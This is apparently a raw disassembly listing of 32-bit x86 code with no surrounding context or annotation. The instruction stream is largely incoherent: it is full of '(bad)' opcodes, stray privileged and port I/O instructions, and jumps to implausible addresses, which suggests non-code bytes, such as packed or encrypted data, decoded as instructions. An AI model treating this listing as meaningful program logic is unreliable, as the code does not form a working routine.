  416610:	add    dh,al
  416612:	jo     0x41662b
  416614:	lods   al,BYTE PTR ds:[esi]
  416615:	xor    edi,ebp
  416617:	push   ebx
  416618:	mov    edx,0x3ca2da9
  41661d:	shl    BYTE PTR ds:0xd23f91a4,cl
  416623:	ficom  WORD PTR ds:0x695b0a64
  416629:	cdq    
  41662a:	inc    esp
  41662b:	ja     0x4165f9
  41662d:	xor    BYTE PTR [esi-0x69],ch
  416630:	in     al,0xc1
  416632:	or     cl,dh
  416634:	xchg   ebx,eax
  416635:	mov    ch,0x7d
  416637:	retf   
  416638:	outs   dx,DWORD PTR ds:[esi]
  416639:	jno    0x41661c
  41663b:	iret   
  41663c:	mul    BYTE PTR [edi+eax*4+0x71d2da1f]
  416643:	and    ebp,DWORD PTR [edi+0x24cba35b]
  416649:	push   ecx
  41664a:	inc    esp
  41664b:	jne    0x4166b0
  41664d:	inc    eax
  41664e:	mov    DWORD PTR [ecx+0x3802bb15],esi
  416654:	hlt    
  416655:	adc    ecx,DWORD PTR [esi+0x3a]
  416658:	jo     0x416609
  41665a:	xchg   esp,eax
  41665b:	mov    al,ds:0x4d8a621d
  416660:	call   0x570c3301
  416665:	fdiv   QWORD PTR [esi+esi*8-0x576316b]
  41666c:	pop    eax
  41666d:	cmc    
  41666e:	sub    eax,ebp
  416670:	nop
  416671:	(bad)  
  416673:	push   ss
  416674:	mov    cl,0xef
  416676:	jae    0x416633
  416678:	mov    ds:0x3960f760,al
  41667d:	and    ebp,edi
  41667f:	dec    eax
  416680:	stos   BYTE PTR es:[edi],al
  416681:	adc    BYTE PTR ds:0xe3fbb4ee,al
  416687:	wrmsr  
  416689:	push   DWORD PTR [ecx]
  41668b:	mov    dl,0x6e
  41668d:	stos   BYTE PTR es:[edi],al
  41668e:	stos   DWORD PTR es:[edi],eax
  41668f:	js     0x41666e
  416691:	inc    ebp
  416692:	adc    ebx,ecx
  416694:	mov    ebx,0x3f9baabd
  416699:	or     ch,BYTE PTR [edi-0x4f]
  41669c:	push   es
  41669d:	cmp    BYTE PTR [esi+0x54],ch
  4166a0:	inc    esi
  4166a1:	ss retf 0x42a
  4166a5:	jo     0x416663
  4166a7:	fwait
  4166a8:	(bad)  
  4166a9:	rcl    DWORD PTR [ebx-0x30],1
  4166ac:	sub    esi,DWORD PTR [ecx-0x6a62b168]
  4166b2:	bswap  ecx
  4166b4:	iret   
  4166b5:	call   0xe8dc:0x1388d0ad
  4166bc:	xor    eax,0xa2cfb4aa
  4166c1:	retf   
  4166c2:	jecxz  0x41671a
  4166c4:	pop    ebp
  4166c5:	add    al,0xac
  4166c7:	sub    BYTE PTR [esi],ch
  4166c9:	xor    eax,0x92d1777a
  4166ce:	out    0x17,eax
  4166d0:	fsubr  QWORD PTR [ebx-0x3]
  4166d3:	mov    BYTE PTR [ebx-0x14],bl
  4166d6:	mov    eax,ds:0x8c26e4ff
  4166db:	cmp    eax,0xcbbd380
  4166e0:	mov    esi,0x1345b99
  4166e5:	dec    eax
  4166e6:	je     0x416765
  4166e8:	cmp    DWORD PTR [ecx+0x30],edx
  4166eb:	and    ebx,DWORD PTR fs:[ebp+0x49b9513a]
  4166f2:	lock je 0x4166c5
  4166f5:	mov    DWORD PTR [edi+0x46],esp
  4166f8:	sahf   
  4166f9:	sbb    edx,DWORD PTR ds:0x957a5853
  4166ff:	mov    dl,0x78
  416701:	add    al,0x8b
  416703:	pop    ebx
  416704:	(bad)  
  416705:	jns    0x416718
  416707:	lods   eax,DWORD PTR ds:[esi]
  416708:	mov    al,ds:0xa4d59881
  41670d:	adc    DWORD PTR [esi-0x18],0xffffffcd
  416711:	mov    al,0x17
  416713:	in     eax,dx
  416714:	inc    ebp
  416715:	mov    WORD PTR [eax],gs
  416717:	hlt    
  416718:	mov    ds:0x968ee33,eax
  41671d:	out    dx,eax
  41671e:	mov    ah,0xb4
  416720:	je     0x4166fd
  416722:	jp     0x416769
  416724:	test   al,0x1e
  416726:	sbb    DWORD PTR [ebx],esi
  416728:	or     DWORD PTR [esi-0x5d],eax
  41672b:	push   0xd75bc827
  416730:	(bad)  
  416731:	popf   
  416732:	xbegin 0x15faffcd
  416738:	test   BYTE PTR ds:0x5fc07bd8,cl
  41673e:	shr    DWORD PTR [edx-0x18ee471c],1
  416744:	repz push esp
  416746:	add    eax,0xcd7076fc
  41674b:	push   edi
  41674c:	add    al,0x32
  41674e:	jnp    0x4166f7
  416750:	sub    ecx,ebp
  416752:	and    al,0x77
  416754:	bound  eax,QWORD PTR ds:0x414a50a
  41675a:	retf   0xc4d0
  41675d:	in     al,dx
  41675e:	rol    ch,0x4
  416761:	xor    eax,0xaa3428f8
  416766:	fadd   QWORD PTR [ecx]
  416768:	retf   0xcb40
  41676b:	pop    es
  41676c:	mov    esp,0xf1287790
  416771:	pop    ecx
  416772:	out    dx,al
  416773:	xlat   BYTE PTR ds:[ebx]
  416774:	sbb    BYTE PTR [ebp+0x34],0xd6
  416778:	jno    0x4167a5
  41677a:	sub    DWORD PTR [edx],ebp
  41677c:	mov    ecx,0xe4fd394b
  416781:	lock xor esp,ebx
  416784:	sbb    ebx,DWORD PTR [edx+ebp*1]
  416787:	add    ecx,DWORD PTR [esi+ecx*2-0x6eefdc56]
  41678e:	dec    esp
  41678f:	out    0xbe,eax
  416791:	add    dl,cl
  416793:	lds    esi,FWORD PTR [ebx+0x3c]
  416796:	add    al,0xec
  416798:	inc    esp
  416799:	imul   eax,DWORD PTR [ebx],0xc93dbad5
  41679f:	scas   al,BYTE PTR es:[edi]
  4167a0:	addr16 and al,0x64
  4167a3:	jmp    0xa761:0x4eaa1b28
  4167aa:	leave  
  4167ab:	push   ebp
  4167ac:	(bad)  
  4167ad:	fxtract 
  4167af:	mul    DWORD PTR [ebx+edx*8-0x3b207d8d]
  4167b6:	xchg   ebx,eax
  4167b7:	jmp    0x41678b
  4167b9:	pop    edx
  4167ba:	or     cl,BYTE PTR [edi-0x114e183f]
  4167c0:	xchg   ebp,edx
  4167c2:	inc    esp
  4167c3:	fiadd  WORD PTR [edx+0x79]
  4167c6:	sbb    ebx,ebx
  4167c8:	cmp    eax,DWORD PTR [ecx-0x53a01ce]
  4167ce:	inc    eax
  4167cf:	add    edx,esi
  4167d1:	sti    
  4167d2:	xchg   ebp,eax
  4167d3:	inc    ebp
  4167d4:	(bad)  
  4167d5:	fnstcw WORD PTR [esi-0x73]
  4167d8:	adc    BYTE PTR [edx+eiz*2+0x1cdc1699],ch
  4167df:	in     al,0xd6
  4167e1:	jmp    0xc1f92b6e
  4167e6:	jnp    0x41685a
  4167e8:	pop    ebx
  4167e9:	das    
  4167ea:	cmp    al,0x1f
  4167ec:	sbb    DWORD PTR [eax+0x2a],ebp
  4167ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167f0:	addr16 sub ebx,esi
  4167f3:	xchg   edx,eax
  4167f4:	scas   al,BYTE PTR es:[edi]
  4167f5:	cmp    al,0x8f
  4167f7:	push   ebx
  4167f8:	inc    ebp
  4167f9:	mov    ah,0x15
  4167fb:	ss pop esp
  4167fd:	xchg   esi,eax
  4167fe:	lods   eax,DWORD PTR ds:[esi]
  4167ff:	lods   eax,DWORD PTR ds:[esi]
  416800:	stos   BYTE PTR es:[edi],al
  416801:	sbb    eax,0x96e70af6
  416806:	stos   DWORD PTR es:[edi],eax
  416807:	sbb    al,0x11
  416809:	xchg   edi,eax
  41680b:	popa   
  41680c:	retf   0xd97a
  41680f:	nop
  416810:	or     eax,0xf9d0564c
  416815:	les    esi,FWORD PTR [edx+0x9]
  416818:	adc    DWORD PTR [edx+0x18],ebx
  41681b:	mov    ch,0x81
  41681d:	retf   0x3964
  416820:	jge    0x4167eb
  416822:	inc    ebx
  416823:	les    eax,FWORD PTR [esi-0x5b]
  416826:	sub    BYTE PTR [ecx+0x58],bl
  416829:	lahf   
  41682a:	and    BYTE PTR [edi+0x1e],bl
  41682d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41682e:	cmp    ecx,esp
  416830:	xchg   ebx,eax
  416831:	mov    bl,0x6e
  416833:	xor    esp,eax
  416835:	sbb    BYTE PTR [ebx],bl
  416837:	inc    eax
  416838:	mov    ch,0x37
  41683a:	test   eax,0x4908ab07
  41683f:	push   ds
  416840:	sub    eax,0x47411512
  416845:	sahf   
  416846:	and    BYTE PTR [eax],cl
  416848:	sbb    BYTE PTR [ebx],bh
  41684a:	mov    bl,0x8d
  41684c:	or     al,0x3f
  41684e:	jne    0x416845
  416850:	scas   al,BYTE PTR es:[edi]
  416851:	clc    
  416852:	iret   
  416853:	push   cs
  416854:	xchg   edi,eax
  416855:	cmc    
  416856:	sti    
  416857:	xchg   edx,eax
  416858:	pop    ecx
  416859:	xor    BYTE PTR [ecx+esi*2],ch
  41685c:	imul   esp,ecx,0xad62903c
  416862:	mov    bl,0xcc
  416864:	push   esp
  416865:	mov    ah,0x8
  416867:	push   cs
  416868:	xchg   BYTE PTR [ecx],al
  41686a:	lock push ebx
  41686c:	dec    esp
  41686d:	pushf  
  41686e:	mov    esi,0x246f5f52
  416873:	rcr    ecx,cl
  416875:	push   0xffffff9c
  416877:	loop   0x4168a2
  416879:	add    esi,DWORD PTR [edx]
  41687b:	hlt    
  41687c:	mov    al,0x33
  41687e:	xchg   ebx,eax
  41687f:	fnstsw ax
  416881:	sub    DWORD PTR [ecx-0x218b47bb],ecx
  416887:	sbb    dh,BYTE PTR [ebp+0x7d]
  41688a:	sar    BYTE PTR [edx-0x66],1
  41688d:	lahf   
  41688e:	(bad)  
  416890:	push   cs
  416891:	neg    BYTE PTR [eax+0x14]
  416894:	mov    edx,0xa3e1f605
  416899:	mov    esp,0x6e207447
  41689e:	inc    ebp
  41689f:	mov    ah,0xcf
  4168a1:	arpl   di,si
  4168a3:	add    ch,BYTE PTR [ecx-0x326d742d]
  4168a9:	(bad)  
  4168aa:	je     0x416833
  4168ac:	(bad)  
  4168ad:	daa    
  4168ae:	and    DWORD PTR [eax-0x77],edi
  4168b1:	xor    al,0xf1
  4168b3:	gs scas al,BYTE PTR es:[edi]
  4168b5:	xchg   edi,eax
  4168b6:	dec    edx
  4168b7:	jo     0x416934
  4168b9:	and    bl,ah
  4168bb:	mov    esi,0xfb32dbba
  4168c0:	sbb    eax,0x2831e88c
  4168c5:	pop    DWORD PTR [edi+ebp*1]
  4168c8:	xchg   edx,eax
  4168c9:	mov    eax,0x4e93198a
  4168ce:	ins    BYTE PTR es:[edi],dx
  4168cf:	bound  eax,QWORD PTR [ecx+0x32]
  4168d2:	pop    ecx
  4168d3:	fs out 0x85,al
  4168d6:	jbe    0x4168bf
  4168d8:	add    esi,DWORD PTR [esi+0x68239635]
  4168de:	leave  
  4168df:	mov    dh,ch
  4168e1:	outs   dx,DWORD PTR ds:[esi]
  4168e2:	add    ch,BYTE PTR [esi-0x683310c0]
  4168e8:	out    0x17,al
  4168ea:	iret   
  4168eb:	hlt    
  4168ec:	in     eax,0x2c
  4168ee:	repnz mov cl,0xcf
  4168f1:	sbb    DWORD PTR [esi+edi*8+0x72952406],ecx
  4168f8:	add    esi,esi
  4168fa:	sub    DWORD PTR [ebx],edx
  4168fc:	dec    ecx
  4168fd:	xor    BYTE PTR [ebx+0x6f],cl
  416900:	xchg   BYTE PTR [edi+0xe888812],bl
  416906:	sbb    DWORD PTR ds:0x9f920bee,edx
  41690c:	(bad)  
  41690d:	mov    esp,ss
  41690f:	push   ebp
  416910:	out    dx,al
  416911:	pop    ecx
  416912:	not    BYTE PTR [ecx]
  416914:	and    al,0xdb
  416916:	mov    WORD PTR [edi-0x48],?
  416919:	mov    cl,0x73
  41691b:	or     DWORD PTR [esi-0xc8fff80],ebp
  416921:	sub    eax,0x6d471af0
  416926:	js     0x4168c6
  416928:	arpl   WORD PTR [ecx+0x157e56e4],sp
  41692e:	mov    ds:0x7a68aab4,eax
  416933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416934:	(bad)  
  416935:	lock push es
  416937:	lods   al,BYTE PTR ds:[esi]
  416938:	jmp    0xeb1dd1
  41693d:	xor    ebp,DWORD PTR [edi]
  41693f:	jge    0x4168cd
  416941:	stos   DWORD PTR es:[edi],eax
  416942:	scas   al,BYTE PTR es:[edi]
  416943:	inc    esp
  416944:	das    
  416945:	cmp    BYTE PTR [edi-0x3e],0x63
  416949:	xchg   esi,eax
  41694a:	adc    al,0xe0
  41694c:	stos   BYTE PTR es:[edi],al
  41694d:	loope  0x4168e8
  41694f:	lahf   
  416950:	(bad)  
  416951:	cmp    BYTE PTR [ecx+0x466c2fa],ah
  416957:	cld    
  416958:	cli    
  416959:	fsub   st(5),st
  41695b:	push   0x25
  41695d:	mov    eax,0x5e189cd6
  416962:	test   al,0xb4
  416964:	into   
  416965:	mov    esp,0x7e18d448
  41696a:	int    0xa3
  41696c:	or     al,0x1
  41696f:	aam    0xdd
  416971:	pop    esp
  416972:	pop    edi
  416973:	or     BYTE PTR [eax],bh
  416975:	das    
  416976:	mov    esi,0xf24c5329
  41697b:	popf   
  41697c:	xchg   edx,eax
  41697d:	sar    dh,1
  41697f:	lea    esi,[edi+eiz*2]
  416982:	daa    
  416983:	sti    
  416984:	out    dx,al
  416985:	adc    BYTE PTR [esi+0x921839],ch
  41698b:	enter  0x81df,0xad
  41698f:	cmp    BYTE PTR [ecx+eax*8],dh
  416992:	mov    ds:0xc35b7eb,eax
  416997:	cmp    ecx,DWORD PTR [edi+0x4d8c9e1e]
  41699d:	outs   dx,BYTE PTR ds:[esi]
  41699e:	daa    
  41699f:	jmp    0x416980
  4169a1:	adc    edi,DWORD PTR [edi]
  4169a3:	pop    ebp
  4169a4:	mov    al,0x51
  4169a6:	int3   
  4169a7:	add    eax,0x6cd0b111
  4169ac:	dec    edi
  4169ad:	and    ecx,eax
  4169af:	ja     0x4169cd
  4169b1:	(bad)  
  4169b2:	out    dx,al
  4169b3:	cmp    al,0x12
  4169b5:	repnz scas al,BYTE PTR es:[edi]
  4169b7:	mov    ecx,0x40b4dad7
  4169bc:	loopne 0x4169a6
  4169be:	push   edi
  4169bf:	(bad)  
  4169c0:	sbb    DWORD PTR [eax-0xd],ebx
  4169c3:	jge    0x4169c3
  4169c5:	mov    esi,0x7c7b0638
  4169ca:	sbb    BYTE PTR [edi-0x71],cl
  4169cd:	push   ss
  4169ce:	pop    edx
  4169cf:	loope  0x416a29
  4169d1:	and    DWORD PTR [edx-0x21aa50cb],ecx
  4169d7:	into   
  4169d8:	icebp  
  4169d9:	jo     0x4169b0
  4169db:	mov    bl,0xb1
  4169dd:	mov    ebp,0x597dc43e
  4169e2:	dec    edi
  4169e3:	rcl    ecx,cl
  4169e5:	fld    TBYTE PTR [edi+0x4d]
  4169e8:	imul   eax,ecx,0x14516406
  4169ee:	test   DWORD PTR [eax],esi
  4169f0:	call   0xf3efe735
  4169f5:	jle    0x416a4d
  4169f7:	fimul  WORD PTR [eax-0x78]
  4169fa:	fld    QWORD PTR [eax]
  4169fc:	xchg   ebp,eax
  4169fd:	jae    0x41699a
  4169ff:	dec    esi
  416a00:	push   edx
  416a01:	mov    cl,0x73
  416a03:	cmp    esp,DWORD PTR [edi+0x24]
  416a06:	test   DWORD PTR [edi-0x54],ebx
  416a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a0a:	mov    eax,0x440fd94c
  416a0f:	(bad)  
  416a10:	xchg   edx,eax
  416a11:	ret    
  416a12:	dec    ebx
  416a13:	cli    
  416a14:	cmp    DWORD PTR [ebp+0x1f],edi
  416a17:	mov    eax,0x8c833fb7
  416a1c:	retf   0x996c
  416a1f:	push   0xaf7b5935
  416a24:	pop    eax
  416a25:	xlat   BYTE PTR ds:[ebx]
  416a26:	ja     0x416a29
  416a28:	add    bh,al
  416a2a:	call   0x43ae3db6
  416a2f:	cli    
  416a30:	cmp    DWORD PTR [esi],0xe9cea4cf
  416a36:	les    ebx,FWORD PTR [eiz*8+0x1f207363]
  416a3d:	xchg   ecx,eax
  416a3e:	adc    edx,DWORD PTR [edx-0x19541627]
  416a44:	push   ds
  416a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a46:	les    ecx,FWORD PTR [ebp+eiz*8-0x2cd60bd6]
  416a4d:	xchg   DWORD PTR [eax],esp
  416a4f:	mov    BYTE PTR [ecx-0x11],0x5c
  416a53:	sub    eax,0x818e8c3
  416a58:	(bad)  
  416a59:	push   0xffffff8f
  416a5b:	shr    edi,1
  416a5d:	xlat   BYTE PTR ds:[ebx]
  416a5e:	fld    TBYTE PTR [ebx-0x80]
  416a61:	dec    ebp
  416a62:	mov    al,0x97
  416a64:	inc    ecx
  416a65:	repz leave 
  416a67:	mov    ch,0x3f
  416a69:	mov    al,gs:0xe45d2aef
  416a6f:	out    dx,al
  416a70:	dec    esp
  416a71:	ret    0x72fa
  416a74:	repz jmp 0x8a3dcae8
  416a7a:	cmp    ah,dh
  416a7c:	xchg   eax,esp
  416a7e:	and    al,0xdb
  416a80:	aad    0x86
  416a82:	push   eax
  416a83:	in     al,dx
  416a84:	dec    edi
  416a85:	push   0xffffffd4
  416a87:	ins    BYTE PTR es:[edi],dx
  416a88:	and    eax,0xc07c2692
  416a8d:	and    cl,BYTE PTR [ecx-0x2fe78281]
  416a93:	ret    0xd626
  416a96:	repnz (bad) 
  416a98:	fidiv  DWORD PTR [edx-0xa]
  416a9b:	fidivr WORD PTR [ebx+0x8]
  416a9e:	outs   dx,BYTE PTR ds:[esi]
  416a9f:	push   ecx
  416aa0:	jmp    0x4b12:0xa4f65b26
  416aa7:	mov    ah,al
  416aa9:	hlt    
  416aaa:	mov    al,0xb
  416aac:	cs ins DWORD PTR es:[edi],dx
  416aae:	lock dec esp
  416ab0:	jl     0x416b13
  416ab2:	outs   dx,DWORD PTR ds:[esi]
  416ab3:	mov    al,0x8a
  416ab5:	mov    dl,0x49
  416ab7:	out    dx,eax
  416ab8:	mov    ah,0xe2
  416aba:	dec    edi
  416abb:	mov    ebp,0xa2f7cdaf
  416ac0:	jge    0x416a7e
  416ac2:	mov    al,0xea
  416ac4:	sbb    BYTE PTR [ebx+ebp*8],ch
  416ac7:	inc    ebx
  416ac8:	out    dx,eax
  416ac9:	outs   dx,BYTE PTR ds:[esi]
  416aca:	pop    ebp
  416acb:	mov    ds:0xedbaa58e,al
  416ad0:	add    ch,al
  416ad2:	jns    0x416ac1
  416ad4:	(bad)  
  416ad5:	mov    bh,0xc9
  416ad7:	mov    gs,WORD PTR [esi-0xb]
  416ada:	retf   0x5b20
  416add:	push   es
  416ade:	and    eax,0xfdd0d5b
  416ae3:	iret   
  416ae4:	ja     0x416af5
  416ae6:	cwde   
  416ae7:	je     0x416b26
  416ae9:	jb     0x416aed
  416aeb:	pop    ecx
  416aec:	pop    esi
  416aed:	aad    0xbc
  416aef:	ss icebp 
  416af1:	stc    
  416af2:	int    0xd
  416af4:	repnz shr BYTE PTR cs:[edi+0x3a],0xa4
  416afa:	xchg   ebx,eax
  416afb:	xor    BYTE PTR [eax],ah
  416afd:	repz push ecx
  416aff:	sbb    al,0x71
  416b01:	cs xor esi,ebx
  416b04:	xor    ebx,DWORD PTR [esi+0x20]
  416b07:	and    esi,DWORD PTR [esi+ecx*1+0xd]
  416b0b:	add    al,0x9a
  416b0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b0e:	lods   al,BYTE PTR ds:[esi]
  416b0f:	daa    
  416b10:	dec    ebx
  416b11:	call   0x4c6:0x115d77b1
  416b18:	je     0x416ad1
  416b1a:	inc    ebx
  416b1b:	cmc    
  416b1c:	xlat   BYTE PTR ds:[ebx]
  416b1d:	lea    esp,[ebx+0x57d99630]
  416b23:	popf   
  416b24:	cmp    BYTE PTR [ebx+0x6829245d],dh
  416b2a:	xchg   esi,eax
  416b2b:	enter  0xd313,0xea
  416b2f:	jbe    0x416ad7
  416b31:	xor    DWORD PTR [edi+0x3b772192],0x357ee62
  416b3b:	cld    
  416b3c:	or     cl,BYTE PTR [edx]
  416b3e:	inc    ecx
  416b3f:	ret    0x58e9
  416b42:	and    ebp,esi
  416b44:	xor    al,0xf1
  416b46:	ins    DWORD PTR es:[edi],dx
  416b47:	fsub   QWORD PTR [edx-0x6a]
  416b4a:	xor    BYTE PTR [eax+0x26],cl
  416b4d:	lods   eax,DWORD PTR ds:[esi]
  416b4e:	jl     0x416b97
  416b50:	mov    eax,ds:0x749b7c5c
  416b55:	(bad)  
  416b56:	das    
  416b57:	xor    al,BYTE PTR [esi+0x38]
  416b5a:	mov    DWORD PTR [esp+ecx*4],esi
  416b5d:	cs cli 
  416b5f:	aaa    
  416b60:	sub    BYTE PTR ds:0xe0f093e,al
  416b66:	and    BYTE PTR [ebx],ah
  416b68:	mov    dh,0xe5
  416b6a:	int    0x80
  416b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b6d:	xor    BYTE PTR [ecx-0x35],al
  416b70:	popf   
  416b71:	sahf   
  416b72:	xor    eax,0x1f3ad6f2
  416b77:	xchg   edi,eax
  416b78:	xchg   ebx,eax
  416b79:	sub    al,0xe1
  416b7b:	data16 sub al,0xa1
  416b7e:	lods   al,BYTE PTR ds:[esi]
  416b7f:	setne  BYTE PTR [ebx-0x241fe8a]
  416b86:	pop    es
  416b87:	inc    edx
  416b88:	pop    esi
  416b89:	jg     0x416b8d
  416b8b:	fbstp  TBYTE PTR [ecx+0x4d]
  416b8e:	test   eax,0x13b59aa
  416b93:	shr    DWORD PTR [ebp-0x5f],1
  416b96:	add    DWORD PTR [edi],ebp
  416b98:	xchg   ebp,eax
  416b99:	out    0x5,eax
  416b9b:	cmp    DWORD PTR ds:0x6fa7b8ed,ebx
  416ba1:	pop    ebx
  416ba2:	outs   dx,BYTE PTR ds:[esi]
  416ba3:	outs   dx,DWORD PTR ds:[esi]
  416ba4:	enter  0x9817,0x37
  416ba8:	test   DWORD PTR [ecx],edi
  416baa:	push   ss
  416bab:	inc    ebp
  416bac:	aaa    
  416bad:	add    esi,esp
  416baf:	xor    esp,DWORD PTR [edx]
  416bb1:	mov    ds:0xf9a3926d,al
  416bb6:	lods   al,BYTE PTR ds:[esi]
  416bb7:	inc    edx
  416bb8:	jle    0x416b64
  416bba:	or     BYTE PTR [esi],bl
  416bbc:	test   DWORD PTR [edx+0x36d4df19],ebx
  416bc2:	sbb    al,0xc1
  416bc4:	shl    esp,cl
  416bc6:	xor    al,0x5d
  416bc8:	add    ah,BYTE PTR [esi]
  416bca:	mov    edi,0x68f1c12e
  416bcf:	or     BYTE PTR [ebp+0x30f5d7ee],dh
  416bd5:	sub    al,0x77
  416bd7:	or     esp,esp
  416bd9:	dec    ebx
  416bda:	or     al,0xac
  416bdc:	shl    edx,cl
  416bde:	jge    0x416b81
  416be0:	sub    ecx,DWORD PTR [esi]
  416be2:	sub    eax,0x5ccecfb4
  416be7:	push   esi
  416be8:	ret    0x6e5d
  416beb:	mov    dh,0x81
  416bed:	ins    BYTE PTR es:[edi],dx
  416bee:	xor    eax,0x5259c3d7
  416bf3:	(bad)  
  416bf5:	and    ebp,DWORD PTR [edi]
  416bf7:	pushf  
  416bf8:	jno    0x416c4f
  416bfa:	ret    0xa0d2
  416bfd:	add    eax,0x6432a87b
  416c02:	imul   ebx,DWORD PTR [ecx]
  416c05:	into   
  416c06:	mov    edi,0x391a0c58
  416c0b:	cmp    BYTE PTR [ebx],bh
  416c0d:	lock lods al,BYTE PTR es:[si]
  416c11:	adc    eax,0x38da2711
  416c16:	jle    0x416bf1
  416c18:	and    DWORD PTR [ebx-0x63],eax
  416c1b:	jnp    0x416bce
  416c1d:	push   esp
  416c1e:	retf   0xa61e
  416c21:	mov    al,0x63
  416c23:	jae    0x416c0c
  416c25:	cmp    ch,bh
  416c27:	ret    
  416c28:	cdq    
  416c29:	xor    edi,esi
  416c2b:	ins    BYTE PTR es:[edi],dx
  416c2c:	leave  
  416c2d:	aam    0xf0
  416c2f:	mov    ds:0x6801b9e6,al
  416c34:	xor    ebp,eax
  416c36:	push   esp
  416c37:	js     0x416ca8
  416c39:	lods   eax,DWORD PTR ds:[esi]
  416c3a:	hlt    
  416c3b:	xor    esi,DWORD PTR [eax]
  416c3d:	fimul  DWORD PTR [ecx+0x4ce15eed]
  416c43:	lea    esp,[esi-0x2]
  416c46:	neg    DWORD PTR [ecx]
  416c48:	cmp    DWORD PTR [edx+0x7c],edi
  416c4b:	sbb    DWORD PTR [eax],eax
  416c4d:	lock call 0xe247a91b
  416c53:	sbb    ebx,DWORD PTR [ecx+ebp*4-0x7c97c63e]
  416c5a:	dec    eax
  416c5b:	pushf  
  416c5c:	loopne 0x416c3d
  416c5e:	ret    0x61c4
  416c61:	xchg   esi,eax
  416c62:	mov    edx,DWORD PTR [ecx-0x69]
  416c65:	and    al,0x6f
  416c67:	push   0x6ec350de
  416c6c:	(bad)  
  416c6e:	push   edi
  416c6f:	add    al,0xb6
  416c71:	cdq    
  416c72:	mov    ah,BYTE PTR [ebx-0x20f65461]
  416c78:	sub    BYTE PTR [edx+0x7fea9f20],bl
  416c7e:	dec    esp
  416c7f:	lock mov dl,0x31
  416c82:	js     0x416cfd
  416c84:	adc    dl,0x5b
  416c87:	mov    al,0xeb
  416c89:	mov    ecx,0xd91254eb
  416c8e:	leave  
  416c8f:	sahf   
  416c90:	push   cs
  416c91:	push   ebx
  416c92:	cmp    al,0x74
  416c94:	add    BYTE PTR fs:[ecx+0x610395a0],bl
  416c9b:	push   ebx
  416c9c:	adc    al,0xac
  416c9e:	stos   BYTE PTR es:[edi],al
  416c9f:	hlt    
  416ca0:	cs mov bl,0x1f
  416ca3:	adc    al,0x44
  416ca5:	mov    ebp,0xb8c6b9aa
  416caa:	data16 mov dh,0x45
  416cad:	in     eax,dx
  416cae:	xchg   edx,eax
  416caf:	pop    ss
  416cb0:	dec    edx
  416cb1:	cld    
  416cb2:	ja     0x416cc2
  416cb4:	dec    eax
  416cb5:	lahf   
  416cb6:	adc    al,0x5d
  416cb8:	add    BYTE PTR [eax-0x4f92607d],bl
  416cbe:	dec    ecx
  416cbf:	jns    0x416cff
  416cc1:	mov    edx,0x3652bd8d
  416cc6:	scas   al,BYTE PTR es:[edi]
  416cc7:	retf   
  416cc8:	xchg   ebp,eax
  416cc9:	mov    edi,0x960d98c
  416cce:	mov    cl,0x29
  416cd0:	pusha  
  416cd1:	fwait
  416cd2:	inc    eax
  416cd3:	adc    eax,0xc3ee118a
  416cd8:	stos   DWORD PTR es:[edi],eax
  416cd9:	(bad)  
  416cda:	sar    BYTE PTR [ebp+0x1e291fd3],cl
  416ce0:	jb     0x416d47
  416ce2:	xor    BYTE PTR [esp+ebp*2-0x3848cbf0],bh
  416ce9:	or     BYTE PTR [edi],ch
  416ceb:	sub    dl,BYTE PTR [edx-0x68]
  416cee:	dec    ebp
  416cef:	cmp    BYTE PTR [esi+0x36],dh
  416cf2:	outs   dx,DWORD PTR ds:[esi]
  416cf3:	lds    ecx,FWORD PTR [edi]
  416cf5:	ret    0x9b69
  416cf8:	out    0x19,al
  416cfa:	pop    edi
  416cfb:	shl    BYTE PTR [eax+0x75],1
  416cfe:	and    BYTE PTR [ecx-0x44],0x74
  416d02:	or     ecx,DWORD PTR [ebp+0x34a9e888]
  416d08:	or     eax,0xd2ceb7f0
  416d0d:	js     0x416d32
  416d0f:	mov    ds:0x4cad26d4,eax
  416d14:	out    dx,al
  416d15:	scas   eax,DWORD PTR es:[edi]
  416d16:	lahf   
  416d17:	push   ecx
  416d18:	jge    0x416d2e
  416d1a:	xchg   edx,eax
  416d1b:	pop    es
  416d1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d1e:	es pusha 
  416d20:	jp     0x416cbc
  416d22:	cmp    eax,0xbe081099
  416d27:	dec    ebx
  416d28:	test   DWORD PTR [ebp+edx*8-0x6b],0x11cd50f6
  416d30:	and    BYTE PTR [bx+di+0x3c44],0x24
  416d36:	outs   dx,BYTE PTR ds:[esi]
  416d37:	adc    BYTE PTR [ecx+ecx*2],0x35
  416d3b:	jb     0x416d20
  416d3d:	and    DWORD PTR [edi+ebx*8],edi
  416d40:	test   al,0xd8
  416d42:	retf   0x4283
  416d45:	mov    al,ds:0x14a1775e
  416d4a:	(bad)  
  416d4b:	not    DWORD PTR [edx]
  416d4d:	sbb    eax,0x90ab9bd
  416d52:	jmp    0x5122829f
  416d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d58:	jnp    0x416cfa
  416d5a:	inc    eax
  416d5b:	jb     0x416d1c
  416d5d:	adc    esp,ebx
  416d5f:	mov    edx,0x3d2822d0
  416d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d65:	dec    esi
  416d66:	test   DWORD PTR [ebx+0x4d288990],0x5be8e2ff
  416d70:	add    edi,edi
  416d72:	cmp    al,0xb1
  416d74:	xchg   ebx,eax
  416d75:	mov    DWORD PTR [ebp-0x16],eax
  416d78:	popa   
  416d79:	sub    bh,cl
  416d7b:	pop    es
  416d7c:	mov    bh,0x9d
  416d7e:	stc    
  416d7f:	mov    al,ds:0xb25778cc
  416d84:	sti    
  416d85:	mov    esp,ebx
  416d87:	call   0x217e:0xc3bbae7e
  416d8e:	(bad)  
  416d8f:	in     al,dx
  416d90:	pop    esp
  416d91:	cmp    BYTE PTR [edi-0x911a6b6],bh
  416d97:	mov    bh,0x54
  416d99:	stc    
  416d9a:	xor    esp,eax
  416d9c:	mov    esp,0xb2f8bd60
  416da1:	and    al,0x1e
  416da3:	test   BYTE PTR [ebx+0x2f],ch
  416da6:	push   ss
  416da7:	daa    
  416da8:	test   bh,ch
